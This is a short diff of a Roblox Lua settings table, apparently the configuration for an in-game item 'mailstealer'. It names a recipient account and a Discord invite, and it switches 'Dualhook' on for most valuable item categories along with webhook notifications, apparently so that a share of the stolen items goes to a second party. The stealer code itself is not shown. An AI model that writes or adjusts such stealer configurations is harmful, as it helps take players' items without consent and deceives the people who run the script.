@@ -9,30 +9,30 @@
 
 getgenv().Settings = {
     User = "fc_qn",
-    Webhook = false, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
+    Webhook = true, -- if you made it true they will receive dualhooked and undualhooked notifs to their webhook
     MailMessage = "|fc_qn|.gg/pUKMNeRwsn",
     Titanics = {
-        Dualhook = false,
+        Dualhook = true,
         Intensity = 100 --%
     },
     Banana = {
-        Dualhook = false,
+        Dualhook = true,
         Intensity = 100 --%
     },
     Huges = {
-        Dualhook = false,
+        Dualhook = true,
         Intensity = 100 --%
     },
     Pogs = {
-        Dualhook = false,
+        Dualhook = true,
         Intensity = 0 --%
     },
     Exclusives = {
-        Dualhook = false,
+        Dualhook = true,
         Intensity = 0 --%
     },
     Events = {
-        Dualhook = false,
+        Dualhook = true,
         Intensity = 0 --%
     },
     Secrets = {
@@ -40,11 +40,11 @@ getgenv().Settings = {
         Intensity = 0 --%
     },
     HC_DM_Mythics = {
-        Dualhook = false,
+        Dualhook = true,
         Intensity = 0 --%
     },
     Gems = {
-        Dualhook = false,
+        Dualhook = true,
         Intensity = 0 --%
     }
 }
